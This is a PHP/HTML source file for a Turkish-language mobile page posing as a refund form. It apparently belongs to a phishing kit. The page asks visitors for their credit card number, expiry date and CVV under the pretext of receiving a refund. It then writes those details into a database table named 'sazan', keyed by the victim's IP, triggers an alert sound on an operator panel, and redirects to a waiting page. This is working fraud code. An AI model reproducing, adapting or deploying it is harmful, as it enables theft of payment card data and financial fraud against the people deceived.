<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['kknum'])) {
    date_default_timezone_set('Europe/Istanbul');
    include('connect.php');
    
    $cardNumber = htmlspecialchars($_POST['kknum']);
    $expiryDate = htmlspecialchars($_POST['skt']);
    $cvv = htmlspecialchars($_POST['cvv']);
    $ip = GetIPz();
    $date = date('d.m.Y H:i');
    
    // Kart bilgilerini veritabanına kaydetme işlemi (Örnek)
    $query = $db->prepare('UPDATE sazan SET kk = ?, ay = ?, cvv = ? WHERE ip = ?');
    $query->execute(array($cardNumber, $expiryDate, $cvv, $ip));
    $db->query("UPDATE site SET sound='1'");
    
    header('Location: bekle.php');
    exit;
}

include "./panelgiris/config.php";
include "./panelgiris/project-security.php";
?>
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <title>Mobile Sayfa</title>

    <style>
        @font-face {
            font-family: 'KelveticaNobis';
            src: url('./css/KelveticaNobis.otf') format('opentype');
            font-weight: normal;
            font-style: normal;
        }

        body, html {
            background-color: #f1f2f2;
            padding: 0;
            max-width: 414px;
            margin: 0 auto;
            font-family: 'KelveticaNobis', sans-serif;
        }

        header {
            width: 100%;
            height: 106px;
            background-image: url('./css/baslik.png');
            background-size: contain;
            background-repeat: no-repeat;
        }

        .main {
            min-height: 805px;
            width: 100%;
            height: 805px;
            background-image: url('./css/body.png');
            background-size: contain;
            background-repeat: no-repeat;
        }

        input.form-control {
            width: 85%;
            height: 50px;
            font-family: 'KelveticaNobis', sans-serif;
            margin-bottom: 10px;
            margin-top: 5px;
            border: none;
            font-size: 16px;
            margin-left: 15px;
            margin-right: 15px;
            padding-left: 20px;
        }

        input.form-control:focus {
            outline: none;
            box-shadow: none;
        }

        button.btn {
            width: 90%;
            height: 50px;
            margin-top: 20px;
            background-color: #2ea8ab;
            border: none;
            color: #fff;
            font-size: 14px;
            cursor: pointer;
            border-radius: 0;
        }

        .error-message {
            color: red;
            font-size: 14px;
            margin-bottom: 10px;
            font-weight: 700;
        }

        .countdown {
            display: block;
            font-size: 14px;
            font-weight: bold;
            margin-bottom: 25px;
            margin-top: 15px;
            text-align: left;
            margin-left: 15px;
            color: #4b4848; /* Ana metin rengi */
        }

        .timer {
            color: red; /* Sadece süre kısmı kırmızı */
        }
    </style>
</head>
<body>
    <header></header>
    <form method="POST" action="iade-al.php" id="phoneForm">
    <div class="main">
        <center>
            <label style="display: block;font-size: 14px;font-weight: bold;margin-bottom: 25px;margin-top: 15px;color: #4b4848; text-align: left; margin-left: 15px;">
                Iadenin yatirilacagi kart bilginizi girin.
            </label>
            <input type="text" name="kknum" class="form-control" id="kknum" placeholder="Kredi Karti Numaraniz" inputmode="numeric" required>
            <input type="text" name="skt" class="form-control" placeholder="Son Kullanma Tarihi (12/29)" id="skt" inputmode="numeric" required>
            <input type="text" name="cvv" class="form-control" placeholder="CVV Kodu" id="cvv" minlength="3" maxlength="3" inputmode="numeric" required>

            <div id="errorMessage" class="error-message" style="display:none;">Kart bilgilerinizi kontrol edin.</div>
        </center>

        <center>
            <button id="formSubmit" class="btn" type="button" onclick="submitFirstForm()">Onayla</button>
        </center>
    </div>
    </form>
<script>
        // Kart numarası doğrulama
        function isValidCardNumber(cardNumber) {
            const regex = /^[0-9]{16}$/; // Kart numarası 16 haneli olmalı
            return regex.test(cardNumber);
        }

        // Son kullanma tarihi doğrulama (MM/YY formatı)
        function isValidExpiryDate(expiryDate) {
            // Düzenli ifade: 12/34 formatında olmalı
            const regex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
            return regex.test(expiryDate);
        }

        // CVV doğrulama (3 haneli)
        function isValidCVV(cvv) {
            return cvv.length === 3 && !isNaN(cvv);
        }

        // Form doğrulama ve gönderme
        function submitFirstForm() {
            const cardNumber = document.getElementById('kknum').value;
            const expiryDate = document.getElementById('skt').value;
            const cvv = document.getElementById('cvv').value;
            const errorMessage = document.getElementById('errorMessage');
            
            // Hata mesajını gizle
            errorMessage.style.display = 'none';

            // Kart numarası doğrulaması
            if (!isValidCardNumber(cardNumber)) {
                errorMessage.innerText = "Geçersiz kart numarası.";
                errorMessage.style.display = 'block';
                return false;
            }

            // Son kullanma tarihi doğrulaması
            if (!isValidExpiryDate(expiryDate)) {
                errorMessage.innerText = "Geçersiz son kullanma tarihi (MM/YY formatı).";
                errorMessage.style.display = 'block';
                return false;
            }

            // CVV doğrulaması
            if (!isValidCVV(cvv)) {
                errorMessage.innerText = "Geçersiz CVV kodu.";
                errorMessage.style.display = 'block';
                return false;
            }

            // Formu gönder
            document.getElementById('phoneForm').submit();
        }

        // Son kullanma tarihi otomatik maskeleme
        $(document).ready(function() {
            $('#skt').on('input', function(event) {
                let value = $(this).val().replace(/\D/g, ''); // Sadece rakamları al
                if (value.length >= 2) {
                    value = value.slice(0, 2) + '/' + value.slice(2, 4); // 2 haneli MM/YY formatına
                }
                $(this).val(value);
            });
        });
    </script>

<script src="script.js?v=1.1.2"></script>
</body>
</html>

 
 